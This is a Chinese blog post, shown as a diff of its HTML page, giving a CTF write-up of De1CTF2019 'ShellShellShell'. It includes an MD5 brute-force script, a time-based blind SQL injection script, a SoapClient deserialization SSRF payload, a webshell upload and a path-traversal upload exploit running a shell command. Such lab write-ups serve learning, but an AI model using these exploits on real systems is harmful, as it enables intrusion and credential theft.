@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="banbird">
+
+
+    <meta name="subtitle" content="Peace & Love">
+
+
+    <meta name="description" content="愿有人陪你颠沛流离">
+
+
+
+<title>De1CTF2019——ShellShellShell | Blacknight</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">blacknight&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">blacknight&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">De1CTF2019——ShellShellShell</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">banbird</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 17, 2020&nbsp;&nbsp;23:30:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/buu%E5%88%B7%E9%A2%98/">buu刷题</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>平台：buuoj.cn<br>打开靶机是一个登录框<br><img src="https://img-blog.csdnimg.cn/20200716163552947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫描器发现一些文件<br><img src="https://img-blog.csdnimg.cn/20200716173658153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>后缀有个<code>~</code>还是第一次见，了解到是编辑器留下的备份文件，访问确实有源码<br>把几个文件都复制下来看看，seay审计软件爆了几个危险部分<br><img src="https://img-blog.csdnimg.cn/20200716190304331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看下位置代码<br><img src="https://img-blog.csdnimg.cn/20200716190929706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将传入的参数传到数据库执行。注意到还有一个get_column函数<br><img src="https://img-blog.csdnimg.cn/20200716220553608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>传入的反引号会被替换成单引号。为sql注入创造了条件<br>看下哪个方法用到了insert函数<br>找到：<br><img src="https://img-blog.csdnimg.cn/2020071621441436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到我们可以post一个signature去insert，并且这里对于这个参数是没有任何过滤的，所以很容易造成Sql注入<br>想要publish，就必须登录。<br><img src="https://img-blog.csdnimg.cn/20200716220808233.png" alt="在这里插入图片描述"><br>因此我们<code>?action=register</code>来注册一个账号并登录<br>然后注册和登录就必须通过code验证<br>可以看到是一个简单的md5碰撞，脚本爆破即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def func(md5_val):</span><br><span class="line">    <span class="keyword">for</span> x in range(<span class="number">999999</span>, <span class="number">100000000</span>):</span><br><span class="line">        md5_value=hashlib.md5(str(x).encode(encoding=<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5_value[:<span class="number">5</span>]==md5_val:</span><br><span class="line">            <span class="keyword">return</span> str(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span>(func(<span class="string">'ac7a2'</span>))</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200716221056709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200716221325866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登录成功我们来抓publish的包验证sql注入<br><img src="https://img-blog.csdnimg.cn/20200716221639298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据代码语句构造payload：<br><img src="https://img-blog.csdnimg.cn/20200716221742595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那么确认了sql注入的存在，由于回显都是ok，考虑时间盲注<br>编写脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://f19eea67-1117-416a-9834-1d58c44d1f53.node3.buuoj.cn/index.php?action=publish"</span></span><br><span class="line">cookie = &#123;<span class="string">"PHPSESSID"</span>:<span class="string">"05gn4tlsacq7pfundd7f89f983"</span>&#125;</span><br><span class="line"></span><br><span class="line">k=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">50</span>): </span><br><span class="line">    <span class="keyword">for</span> j in k:</span><br><span class="line">        j = ord(j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'mood'</span>:<span class="string">'0'</span>,</span><br><span class="line">            <span class="string">'signature'</span>:<span class="string">'1`,if(ascii(substr((select password from ctf_users where username=`admin`),&#123;&#125;,1))=&#123;&#125;,sleep(3),0))#'</span>.format(i,j)</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url,data=data,cookies=cookie,timeout=(<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line">        except:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            <span class="keyword">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>至于这里为什么是知道跑admin和ctf_users表，嗯。。。。。看代码得到的<br><img src="https://img-blog.csdnimg.cn/20200716224909501.png" alt="在这里插入图片描述"><br>跑出密码的md5：<code>c991707fdf339958eded91331fb11ba0</code><br>网站解密得<code>jaivypassword</code><br>知道了admin和password，我们来试着登录<br>却登录失败<br><img src="https://img-blog.csdnimg.cn/20200716225347570.png" alt="在这里插入图片描述"><br>原来设置了ip限制<br><img src="https://img-blog.csdnimg.cn/202007162254256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跟进get_ip函数<br><img src="https://img-blog.csdnimg.cn/20200716225458365.png" alt="在这里插入图片描述"><br>看来只有真实管理员地址才能登录<br>这里就出现了另一个考点：<strong>soapclient反序列化配合ssrf</strong><br>通过<code>?action=phpinfo</code>看到php开启了soap拓展<br><img src="https://img-blog.csdnimg.cn/20200716233422392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>PHP 中，soap扩展可以用来提供和使用 Web Services，关于Web Services，<a href="https://baike.baidu.com/item/Web%20Service/1215039?fr=aladdin" target="_blank" rel="noopener">百度百科</a><br>soapclient类则是用来创建soap数据报文，与wsdl接口进行交互，它有几个内置魔术方法<br><img src="https://img-blog.csdnimg.cn/2020071623374458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>回到代码，showmess函数中有一个反序列化点<br><img src="https://img-blog.csdnimg.cn/20200716231933426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt=""><br>反序列化<code>$row[2]</code>的值也就是<code>$mood</code>是我们可控的，假如我们把反序列化语句插入到注入语句中，比如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a`,&#123;serialize);<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>它传入库中，我们访问<code>index.php?action=index</code>的时候就会触发<br>来实际操作一下<br>首先一个页面保持自己的非admin账号登录状态，另开一个页面不登录，这里为了防止cookie干扰就直接另开一个浏览器<br><img src="https://img-blog.csdnimg.cn/20200717093435307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200717093451148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着开始构造soap，原理参考<a href="https://xz.aliyun.com/t/2148#toc-0" target="_blank" rel="noopener">这位师傅</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/index.php?action=login'</span>;</span><br><span class="line">$post_string = <span class="string">'username=admin&amp;password=jaivypassword&amp;code=1174162'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=c10j7vc0fu9v8gf52qt9st4pr0'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里注意code和PHPSESSID要和未登录页面保持一致<br>把生成的poc在publish插进去<br><img src="https://img-blog.csdnimg.cn/20200717100124148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>刷新一下?action=index使得库中的数据触发<br>这时<code>$mood</code>就是一个soap类，反序列化之后它访问不存在的方法就会触发内置<code>__call()</code>魔术方法<br><img src="https://img-blog.csdnimg.cn/20200717102938344.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200717104345257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也就是给该session登录的用户管理员身份<br>用另一个页面登录管理员账号看看<br>成功登录<br><img src="https://img-blog.csdnimg.cn/20200717100023992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点开publish是一个上传<br><img src="https://img-blog.csdnimg.cn/20200717104607913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>让我们传图片但啥也没过滤，直接一句话传成功<br><img src="https://img-blog.csdnimg.cn/20200717105336123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>蚁剑连上<br><img src="https://img-blog.csdnimg.cn/20200717105607205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之前说了flag在内网，查看下内网信息<br><img src="https://img-blog.csdnimg.cn/20200717110225698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫下其他内网主机的端口<br>发现11主机开了80端口<br><img src="https://img-blog.csdnimg.cn/20200717110503559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问下有内容<br><img src="https://img-blog.csdnimg.cn/20200717110711187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>保存下来<br><img src="https://img-blog.csdnimg.cn/20200717110822143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到源码<br><img src="https://img-blog.csdnimg.cn/20200717110812894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有两层需要绕过<br><img src="https://img-blog.csdnimg.cn/20200717113228784.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200717113246813.png" alt="在这里插入图片描述"><br>第一层数组来绕过，第二层随机文件名用路径穿越绕过。<br>构造<code>file[1]=aaa&amp;file[0]=php/../blacknight.php</code><br>postman构造传入<br><img src="https://img-blog.csdnimg.cn/20200717122058563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击右上方的code选择php-cURL生成代码<br><img src="https://img-blog.csdnimg.cn/20200717122124852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但没有我们上传的内容所以要自己构造，这里参考<a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">赵总</a><br>最终exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$curl = curl_init();</span><br><span class="line"></span><br><span class="line">curl_setopt_array($curl, <span class="keyword">array</span>(</span><br><span class="line">  CURLOPT_URL =&gt; <span class="string">"http://173.24.214.11"</span>,</span><br><span class="line">  CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">true</span>,</span><br><span class="line">  CURLOPT_ENCODING =&gt; <span class="string">""</span>,</span><br><span class="line">  CURLOPT_MAXREDIRS =&gt; <span class="number">10</span>,</span><br><span class="line">  CURLOPT_TIMEOUT =&gt; <span class="number">30</span>,</span><br><span class="line">  CURLOPT_HTTP_VERSION =&gt; CURL_HTTP_VERSION_1_1,</span><br><span class="line">  CURLOPT_CUSTOMREQUEST =&gt; <span class="string">"POST"</span>,</span><br><span class="line">  CURLOPT_POSTFIELDS =&gt; <span class="string">"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"blacknight.php\"\r\nContent-Type: false\r\n\r\n@&lt;?php echo `find /etc -name *flag* -exec cat &#123;&#125; +`;\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"hello\"\r\n\r\nblacknight.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file[2]\"\r\n\r\n222\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file[1]\"\r\n\r\n111\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file[0]\"\r\n\r\n/../blacknight.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nSubmit\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"</span>,</span><br><span class="line">  CURLOPT_HTTPHEADER =&gt; <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"Postman-Token: a23f25ff-a221-47ef-9cfc-3ef4bd560c22"</span>,</span><br><span class="line">    <span class="string">"cache-control: no-cache"</span>,</span><br><span class="line">    <span class="string">"content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"</span></span><br><span class="line">  ),</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$response = curl_exec($curl);</span><br><span class="line">$err = curl_error($curl);</span><br><span class="line"></span><br><span class="line">curl_close($curl);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($err) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"cURL Error #:"</span> . $err;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>把flag查询语句放到中间<br>全部复制下来放到php文件中上传<br><img src="https://img-blog.csdnimg.cn/20200717123207930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问即得flag<br><img src="https://img-blog.csdnimg.cn/2020071712322539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>信息量太大，做的我脑瓜子嗡嗡的</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>banbird</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.blacknight.top/2020/07/17/[De1CTF%202019]ShellShellShell/">http://www.blacknight.top/2020/07/17/[De1CTF%202019]ShellShellShell/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"># 代码审计</a>
+                    
+                        <a href="/tags/soap-serialize-ssrf/"># soap_serialize_ssrf</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/07/19/61dctf_web/">61dctfweb复现</a>
+            
+            
+            <a class="next" rel="next" href="/2020/07/15/CBC_thinking/">初探CBC字节翻转攻击</a>
+            
+        </section>
+
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: '8biphXJF0NRr0Xnr2pEPIjYa-gzGzoHsz',
+      app_key: '0RbmT7aNG8nj44MHrGMt9JFk',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+    </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© banbird | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
